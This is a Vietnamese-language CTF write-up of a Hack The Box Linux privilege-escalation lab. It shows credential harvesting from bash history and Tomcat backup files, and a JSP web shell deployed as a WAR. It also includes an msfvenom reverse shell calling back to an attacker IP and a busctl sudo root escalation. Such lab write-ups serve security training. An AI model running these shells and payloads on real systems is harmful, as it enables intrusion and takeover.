---
layout: default
title: "Linux Privlege Escalation Skill Assessment"
date: 2025-06-10 00:00:00 +0700
tags: [CTF]
---
# Flag 1:
```bash
htb-student@nix03:~$ find / 2>/dev/null | grep "flag*"

/home/htb-student/.config/.flag1.txt
/home/barry/flag2.txt
/var/log/flag3.txt
/var/lib/tomcat9/flag4.txt
```
Check quyền và lấy flag1 :
```bash
htb-student@nix03:~$ ls -l /home/htb-student/.config/.flag1.txt
-rw-r--r-- 1 htb-student www-data 33 Sep  6  2020 /home/htb-student/.config/.flag1.txt

htb-student@nix03:~$ cat /home/htb-student/.config/.flag1.txt
LLPE{d0n_ov3rl00k_h1dden_f1les!}
```

# Flag 2:
Check quyền flag2 :
```bash
htb-student@nix03:~$ ls -l /home/barry/flag2.txt
-rwx------ 1 barry barry 29 Sep  5  2020 /home/barry/flag2.txt
```
Muốn đọc được flag 2 thì chỉ có thể leo quyền lên tài khoản `barry` hoặc `root`.

Kiểm tra thư mục `/home` của `barry` : 
```bash
htb-student@nix03:~$ ls -la /home/barry/
total 40
drwxr-xr-x 5 barry barry 4096 Sep  5  2020 .
drwxr-xr-x 5 root  root  4096 Sep  6  2020 ..
-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
-rw-r--r-- 1 barry barry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 barry barry 3771 Feb 25  2020 .bashrc
drwx------ 2 barry barry 4096 Sep  5  2020 .cache
-rwx------ 1 barry barry   29 Sep  5  2020 flag2.txt
drwxrwxr-x 3 barry barry 4096 Sep  5  2020 .local
-rw-r--r-- 1 barry barry  807 Feb 25  2020 .profile
drwx------ 2 barry barry 4096 Sep  5  2020 .ssh
```
Check thấy có thể đọc file `.bash_history` , `.bash_logout` ,`.bashrc` ,`.local` , `.profile` , và khi đọc file `.bash_history` ta tìm đc cred login ssh của `barry` :
```bash
htb-student@nix03:~$ cat /home/barry/.bash_history
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
history -d 6
history
history -d 12
history
cd /home/bash
cd /home/barry/
nano .bash_history
history
exit
history
exit
ls -la
ls -l
history
history -d 21
history
exit
id
ls /var/log
history
history -d 28
history
exit
```
Thử `ssh` với cred đó nhưng không được,thử lại với account `barry` và pass  `i_l0ve_s3cur1ty!` ta đã login được với account `barry` và lấy flag 2:
```bash
barry@nix03:~$ cat /home/barry/flag2.txt
LLPE{ch3ck_th0se_cmd_l1nes!}
```

# Flag 3 :
Kiểm tra accout `barry` :
```bash
barry@nix03:~$ id
uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```
Kiểm tra flag3 :
```bash
barry@nix03:~$ ls -la /var/log/flag3.txt
-rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
```
Do account `barry` thuộc group `adm` nên có quyền đọc flag3:
```bash
barry@nix03:~$ cat /var/log/flag3.txt
LLPE{h3y_l00k_a_fl@g!}
```
# Flag 4 :
Kiểm tra các cổng mạng đang mở và các tiến trình đang lắng nghe trên các cổng đó:\
```bash
barry@nix03:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::33060                :::*                    LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 10.129.98.92:68         0.0.0.0:* 
```
Ta thấy có port 3306 là cổng mặc định của MySQL, port 80 và port 8080.
Truy cập `<ip>:8080` bằng browser ta phát hiện `tomcat` đang chạy:
```html
It works !
If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!

This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat9/webapps/ROOT/index.html

Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.

You might consider installing the following packages, if you haven't already done so:

tomcat9-docs: This package installs a web application that allows to browse the Tomcat 9 documentation locally. Once installed, you can access it by clicking here.

tomcat9-examples: This package installs a web application that allows to access the Tomcat 9 Servlet and JSP examples. Once installed, you can access it by clicking here.

tomcat9-admin: This package installs two web applications that can help managing this Tomcat instance. Once installed, you can access the manager webapp and the host-manager webapp.

NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.
```
Thử kiểm tra  `/etc/tomcat9/tomcat-users.xml` thì không có quyền đọc:
```bash
htb-student@nix03:~$ ls -l /etc/tomcat9/tomcat-users.xml
-rw-r----- 1 root tomcat 2232 Sep  5  2020 /etc/tomcat9/tomcat-users.xml
```
Thử tìm xem có file bakup của `tomcat-users.xml` mà ta có thể đọc được không :
```bash
barry@nix03:~$ find / 2>/dev/null | grep "tomcat-users.xml"
/etc/tomcat9/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml.bak
/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
```
Sau khi check thì ta chỉ có thể đọc file `/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml` và `tomcat-users.xml.bak` và `/usr/share/tomcat9/etc/tomcat-users.xml`.

Kiểm tra nội dung  2 file ta phát hiện account admin :
```
<user username="admin" password="admin" roles="admin,manager-gui,manager-script,admin-gui"/>

Và 

 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
 ```
 Thử và phát hiện đăng nhập vào `/manager/html` với `tomcatadm:T0mc@t_s3cret_p@ss!`

Trong `Tomcat WEB Application Manager` có chức năng deploy file WAR,ta có thể dùng để upload web shell.
### Tạo JSP webshell
Đầu tiên tạo file `shell.jsp` :
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr); 
        disr = dis.readLine();
    }
}
%>
```
Tiếp theo tạo file `web.xml` :
```xml
<!-- jspShell/WEB-INF/web.xml -->
<web-app>
  <servlet>
    <servlet-name>shell</servlet-name>
    <jsp-file>/shell.jsp</jsp-file>
  </servlet>
  <servlet-mapping>
    <servlet-name>shell</servlet-name>
    <url-pattern>/shell.jsp</url-pattern>
  </servlet-mapping>
</web-app>
```
Với cấu trúc thư mục như sau :
```
jspShell/
├── shell.jsp
└── WEB_INF/
    └── web.xml
```
Đóng gói lại `WAF`:
```powershell
jar -cvf jspShell.war -C jspShell .
```
Upload `jspShell.war` lên và truy cập webshell ở `/jspShell/shell.jsp` và đọc flag.

# Flag 5 :

Tạo reverse shell war bằng `msfvenom` :
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.110 LPORT=4444 -f war > shell.war
```

Rev shell vào `tomcat` :
```bash
❯ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.15.110] from (UNKNOWN) [10.129.98.92] 37952

id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```
Upgrade simple shell: 
```bash
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)

python3 -c 'import pty; pty.spawn("/usr/bin/bash")'
tomcat@nix03:/var/lib/tomcat9$ 
```
Kiểm tra quyền sudo:
```bash
tomcat@nix03:/var/lib/tomcat9$ sudo -l
sudo -l
Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```
Check trên `GTFOBins` ta có payload leo quyền `root`:
```bash
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
Leo quyền và đọc flag 5:
```bash
tomcat@nix03:/var/lib/tomcat9$ sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
<:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

# id
id
uid=0(root) gid=0(root) groups=0(root)

root@nix03:/var/lib/tomcat9# cat /root/flag*
cat /root/flag*
LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
# 
```




